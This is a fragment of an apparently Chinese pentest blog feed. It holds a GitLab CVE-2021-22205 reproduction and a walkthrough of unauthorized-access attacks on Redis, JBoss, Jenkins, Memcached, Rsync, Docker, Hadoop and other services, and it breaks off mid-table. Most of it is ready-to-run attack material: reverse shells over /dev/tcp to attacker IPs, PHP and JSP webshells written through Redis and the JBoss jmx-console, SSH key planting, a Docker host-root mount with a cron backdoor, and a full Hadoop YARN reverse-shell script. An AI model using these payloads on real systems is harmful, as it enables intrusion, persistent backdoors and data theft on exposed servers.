title="漏洞复现"></a>漏洞复现</h1><p>搭建环境，本次使用的是Gitlab 13.2.3<br><img src="https://s2.loli.net/2022/03/28/zYZLrVglvuNxJ4I.png" alt="图片.png"><br>这里直接用大佬的<a href="https://github.com/Al1ex/CVE-2021-22205">EXP</a><br><img src="https://s2.loli.net/2022/03/28/1VlwToEuQ6Rh759.png" alt="图片.png"></p><ul><li>命令执行<br><img src="https://s2.loli.net/2022/03/28/XEPZSuNDnrbct4U.png" alt="图片.png"></li><li>反弹shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;  #将反弹shell命令写到&#x2F;tmp&#x2F;1.sh中</span><br><span class="line">python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;  #sh脚本加执行权限 </span><br><span class="line">python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;  #运行脚本</span><br></pre></td></tr></table></figure>未加 x 是这样的<br><img src="https://s2.loli.net/2022/03/28/Eo85vdIlek9qT13.png" alt="图片.png"><br>加完之后<br><img src="https://s2.loli.net/2022/03/28/kpBKOXbd5Eacyln.png" alt="图片.png"><br>执行成功<br><img src="https://s2.loli.net/2022/03/28/GsXWgDC86IQE14P.png" alt="图片.png"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h1&gt;&lt;p&gt;GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，是一款Ruby开发的Git项目管理平台。由于在</summary>
      
    
    
    
    <category term="Web渗透" scheme="http://nice759.com/Categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="gitlab" scheme="http://nice759.com/tags/gitlab/"/>
    
    <category term="cve-2021-22205" scheme="http://nice759.com/tags/cve-2021-22205/"/>
    
  </entry>
  
  <entry>
    <title>常见的未授权访问</title>
    <link href="http://nice759.com/2022/03/28/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://nice759.com/2022/03/28/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2022-03-28T07:18:23.000Z</published>
    <updated>2022-03-28T07:21:27.001Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见的未授权访问-md"><a href="#常见的未授权访问-md" class="headerlink" title="常见的未授权访问.md"></a>常见的未授权访问.md</h1><h1 id="1-Redis未授权访问"><a href="#1-Redis未授权访问" class="headerlink" title="1 Redis未授权访问"></a>1 Redis未授权访问</h1><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>，并提供多种语言的API。</p><p>Redis默认情况下，会绑定在<code>0.0.0.0:6379</code>，如果Redis服务对外开放，且未启用认证时，攻击者可以访问Redis的数据，甚至写入webshell或者计划任务获取权限。</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><ul><li>poc</li></ul><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">PASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]</span><br><span class="line">def check(ip, port, timeout):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;INFO\r\n&quot;)</span><br><span class="line">        result &#x3D; s.recv(1024)</span><br><span class="line">        if &quot;redis_version&quot; in result:</span><br><span class="line">            return u&quot;未授权访问&quot;</span><br><span class="line">        elif &quot;Authentication&quot; in result:</span><br><span class="line">            for pass_ in PASSWORD_DIC:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, int(port)))</span><br><span class="line">                s.send(&quot;AUTH %s\r\n&quot; %(pass_))</span><br><span class="line">                result &#x3D; s.recv(1024)</span><br><span class="line">                if &#39;+OK&#39; in result:</span><br><span class="line">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ip&#x3D;sys.argv[1]</span><br><span class="line">    port&#x3D;sys.argv[2]</span><br><span class="line">    print check(ip,port, timeout&#x3D;10)</span><br></pre></td></tr></table></figure><ul><li>nmap</li></ul><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6379 --script redis-info x.x.x.x</span><br></pre></td></tr></table></figure><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>Redis默认端口为<code>6379</code>，Redis对外开放且未启用认证时，可使用 <code>redis-cli</code> 工具来连接Redis</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h x.x.x.x</span><br></pre></td></tr></table></figure><p>Redis常见的getshell方法有：</p><ol><li>通过向Web目录中写webshell的方式进行getshell</li><li>通过写SSH key的方式进行getshell</li><li>通过写corntab的方式进行getshell</li></ol><ul><li><strong>通过向Web目录中写webshell的方式进行getshell</strong></li></ul><p>Web目录已知，当前用户在该目录下具有写权限。</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;      #写shell的路径</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">config set webshell &quot;&lt;?php @eval($_POST[&#39;fuck&#39;]);?&gt;&quot;</span><br><span class="line">save</span><br><span class="line"># 第三步写入webshell时可以使用以下命令，\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);</span><br><span class="line">fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>通过写SSH key的方式进行getshell</strong></li></ul><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen-trsa -t rsa # 在本地生成公钥文件,密码为空</span><br><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n\n\n&quot;) &gt; pub.txt # 进入.ssh目录中，将生成的公钥写到文件中</span><br><span class="line">cat pub.txt | redis-cli -h x.x.x.x -x set crack # 连接目标Redis，将保存的ssh公钥pub.txt写入Redis</span><br><span class="line"></span><br><span class="line">redis-cli -h x.x.x.x                  &#x2F;***</span><br><span class="line">config get dir  # 获取redis备份的路径  *</span><br><span class="line">confid set dir &#x2F;root&#x2F;.ssh              * 远程登录Redis服务器,保存公钥</span><br><span class="line">config set dbfilename authorized_keys  *</span><br><span class="line">save                                    *&#x2F;</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@xxx.xxx.xxx.xxx #  ssh远程连接</span><br></pre></td></tr></table></figure><ul><li><strong>通过写corntab的方式进行getshell</strong></li></ul><p>权限足够大时，可以使用该方法getshell</p><p>本地监听未占用的端口</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p>连接Redis，写入反弹shell</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">config set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="2-JBoss未授权访问"><a href="#2-JBoss未授权访问" class="headerlink" title="2 JBoss未授权访问"></a><strong>2 JBoss未授权访问</strong></h2><p>JBoss是一个基于J2EE的<a href="https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81/114160">开放源代码</a>的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/4971773">应用服务器</a>。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><p>在低版本中，默认可以访问Jboss web控制台(<a href="http://127.0.0.1:8080/jmx-console)%EF%BC%8C%E6%97%A0%E9%9C%80%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E3%80%82">http://127.0.0.1:8080/jmx-console)，无需用户名和密码。攻击者可通过漏洞上传木马。</a></p><h2 id="漏洞详情-1"><a href="#漏洞详情-1" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>直接访问jboss控制台 <a href="http://192.168.78.129/jmx-console/">http://192.168.78.129/jmx-console/</a></p><ul><li>直接写入一句话</li></ul><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip&#x2F;jmx-console&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType&#x3D;boolean&amp;arg4&#x3D;True</span><br><span class="line">arg0代表war包的名称，arg1&#x3D;文件名称，arg2&#x3D;文件后缀名，arg3&#x3D;文件内容</span><br><span class="line">解码：&lt;% if(request.getParameter(“f”)!&#x3D;null)(new java.io.FileOutputStream(application.getRealPath(“&#x2F;”)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes()); %&gt;</span><br><span class="line">http:&#x2F;&#x2F;192.168.78.129&#x2F;August&#x2F;shell.jsp?f&#x3D;1.txt&amp;t&#x3D;hello%20world! ## 写入1.txt</span><br><span class="line">http:&#x2F;&#x2F;192.168.78.129&#x2F;August&#x2F;1.txt  ##访问1.txt</span><br></pre></td></tr></table></figure><ul><li>远程部署</li></ul><p>制作war马</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf shell.war index.jsp</span><br></pre></td></tr></table></figure><p>通过python http.server部署shell.war<br>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）</p><h2 id="3-Jenkins未授权访问"><a href="#3-Jenkins未授权访问" class="headerlink" title="3 Jenkins未授权访问"></a><strong>3 Jenkins未授权访问</strong></h2><p>Jenkins是一个独立的、开放<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">源码</a>的自动化服务器，它可以用于自动化与构建、测试、交付或部署软件相关的各种任务。Jenkins是一个CI工具。它可以根据设定持续定期编译，运行相应代码；运行UT或集成测试；将运行结果发送至邮件，或展示成报告</p><p>默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</p><h2 id="漏洞详情-2"><a href="#漏洞详情-2" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>直接访问<code>http://&lt;target_IP&gt;:8080/manage</code><br>其中<code>脚本命令执行</code>模块可以执行命令：</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println &quot;ipconfig&quot;.execute().text</span><br><span class="line">println &quot;whoami&quot;.execute().text</span><br><span class="line">println &quot;cat &#x2F;etc&#x2F;passwd&quot;.execute().text</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;Kali_IP&gt;&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h1 id="4-LDAP未授权访问"><a href="#4-LDAP未授权访问" class="headerlink" title="4 LDAP未授权访问"></a>4 <strong>LDAP未授权访问</strong></h1><p>LDAP：Light Directory Access Portocol，它是基于X.500标准的轻量级目录访问协议。默认端口是<code>389</code>，漏洞产生的原因是因为默认配置不当。</p><h2 id="漏洞详情-3"><a href="#漏洞详情-3" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>使用ldapbrowser直接连接，获取目录内容。或者使用<code>ldapsearch</code>工具连接：</p><p>检测POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ldap3 <span class="keyword">import</span> Connection,Server</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    server = Server(ip,get_info = <span class="built_in">all</span>, connect_timeout = <span class="number">1</span>)</span><br><span class="line">    con = Connection(server,auto_bind = <span class="literal">True</span>)</span><br><span class="line">    print(<span class="string">&quot;+&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;-&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="5-Elasticsearch未授权访问"><a href="#5-Elasticsearch未授权访问" class="headerlink" title="5 Elasticsearch未授权访问"></a>5 <strong>Elasticsearch未授权访问</strong></h1><p>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。</p><p>Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放<code>9200</code>或<code>9300</code>的服务器进行恶意攻击。</p><h2 id="漏洞详情-4"><a href="#漏洞详情-4" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>漏洞点相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:<span class="number">9200</span>/_nodes</span><br><span class="line">http://x.x.x.x:9200/_nodes?prettify</span><br><span class="line">http://x.x.x.x:<span class="number">9200</span>/_cat/indices</span><br><span class="line">http://x.x.x.x:<span class="number">9200</span>/_plugin/head/</span><br><span class="line">http://x.x.x.x:<span class="number">9200</span>/_status</span><br><span class="line">http://x.x.x.x:<span class="number">9200</span>/_river</span><br><span class="line">http://x.x.x.x:9200/_search?pretty</span><br><span class="line">http://x.x.x.x:<span class="number">9200</span>/zjftu/</span><br><span class="line">http://x.x.x.x:9200/zjftu/_search?pretty</span><br></pre></td></tr></table></figure><h1 id="6-MenCache未授权访问"><a href="#6-MenCache未授权访问" class="headerlink" title="6 MenCache未授权访问"></a>6 MenCache未授权访问</h1><p>Memcached 分布式缓存系统，默认的 11211 端口不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露</p><p>无需用户名密码，可以直接连接memcache 服务的11211端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet x.x.x.x <span class="number">11211</span></span><br><span class="line">stats //查看memcache 服务状态</span><br><span class="line">stats items //查看所有items</span><br><span class="line">stats cachedump <span class="number">32</span> <span class="number">0</span> //获得缓存key</span><br><span class="line">get :state:<span class="number">264861539228401373</span>:<span class="number">261588</span> //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><p>检测POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">       socket.setdefaulttimeout(timeout)</span><br><span class="line">       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">       s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">       s.send(<span class="string">&quot;stats\r\n&quot;</span>)</span><br><span class="line">       result = s.recv(<span class="number">1024</span>)</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;STAT version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">           <span class="built_in">print</span> (<span class="string">&quot;[+] Memcache Unauthorized: &quot;</span> +ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(port))</span><br><span class="line">   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">       <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="7-Mongodb未授权访问"><a href="#7-Mongodb未授权访问" class="headerlink" title="7 Mongodb未授权访问"></a>7 Mongodb未授权访问</h1><p>MongoDB服务开启时不加任何参数，默认是没有开启认证的，攻击者通过默认端口，无需密码就能远程登录，连接数据库进行任何操作</p><h2 id="漏洞详情-5"><a href="#漏洞详情-5" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>MongoDB默认端口为<code>27017</code></p><p>使用MongoDB数据库连接工具远程登录</p><p>使用NaviCat远程登陆</p><h1 id="8-Rsync未授权访问"><a href="#8-Rsync未授权访问" class="headerlink" title="8 Rsync未授权访问"></a>8 Rsync未授权访问</h1><p>Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录</p><p>Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 <code>837</code></p><h2 id="漏洞详情-6"><a href="#漏洞详情-6" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>Kali下使用工具<code>rsync</code>连接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://&lt;target_IP&gt;:<span class="number">873</span>/</span><br><span class="line">rsync rsync://&lt;target_IP&gt;:<span class="number">873</span>/src</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下载文件或目录到本地：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> rsync – avz <span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span> :: WWW/ /var/tmp </span><br><span class="line">rsync – avz <span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span> :: www/ /var/tmp</span><br></pre></td></tr></table></figure><p>上传本地文件到服务端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz webshell <span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span> :: WWW /</span><br></pre></td></tr></table></figure><h1 id="9-Zookeeper未授权访问"><a href="#9-Zookeeper未授权访问" class="headerlink" title="9 Zookeeper未授权访问"></a>9 Zookeeper未授权访问</h1><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p><h1 id="漏洞详情-7"><a href="#漏洞详情-7" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>ZooKeeper默认开启在<code>2181</code>端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。远程执行命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo envi | nc xx.xx.xx.xx:<span class="number">2181</span></span><br></pre></td></tr></table></figure><h1 id="10-Docker未授权访问"><a href="#10-Docker未授权访问" class="headerlink" title="10 Docker未授权访问"></a>10 Docker未授权访问</h1><p>该未授权访问漏洞是因为docker remote api可以执行docker命令，从官方文档可以看出，该接口的目的是取代docker 命令界面，通过url操作docker。</p><p>docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，会调用这个api。</p><h2 id="漏洞详情-8"><a href="#漏洞详情-8" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>当访问<code>ip:2375/version</code>时，页面会返回docker的基本信息，与<code>docker version</code>命令效果一致。</p><p>当访问<code>ip:2375/v1.23/containers/json</code>时，页面会返回容器信息，与<code>docekr ps -a</code>命令效果相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://&lt;target&gt;:<span class="number">2375</span>/containers/json <span class="comment">#列出容器信息，效果与docker ps一致</span></span><br><span class="line">docker -H tcp://&lt;target&gt;:<span class="number">2375</span> ps -a <span class="comment">#启动容器</span></span><br><span class="line">sudo docker -H tcp://<span class="number">10.1</span><span class="number">.1</span><span class="number">.211</span>:<span class="number">2375</span> run -it -v /:/mnt nginx:latest /<span class="built_in">bin</span>/bash <span class="comment">#新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。</span></span><br><span class="line">echo <span class="string">&#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1&#x27;</span> &gt;&gt; /mnt/var/spool/cron/crontabs/root <span class="comment"># 在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="11-Hadoop未授权访问"><a href="#11-Hadoop未授权访问" class="headerlink" title="11 Hadoop未授权访问"></a>11 <strong>Hadoop未授权访问</strong></h1><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的<code>50070</code>端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p><h2 id="漏洞详情-9"><a href="#漏洞详情-9" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>访问<code>http://&lt;target_IP&gt;:8088/</code></p><p>利用POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.18.129:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.18.138&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><h1 id="12-Swagger未授权访问"><a href="#12-Swagger未授权访问" class="headerlink" title="12 Swagger未授权访问"></a>12 <strong>Swagger未授权访问</strong></h1><p>Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p><h2 id="漏洞详情-10"><a href="#漏洞详情-10" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>可利用未授权访问漏洞，直接访问以下链接：</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td 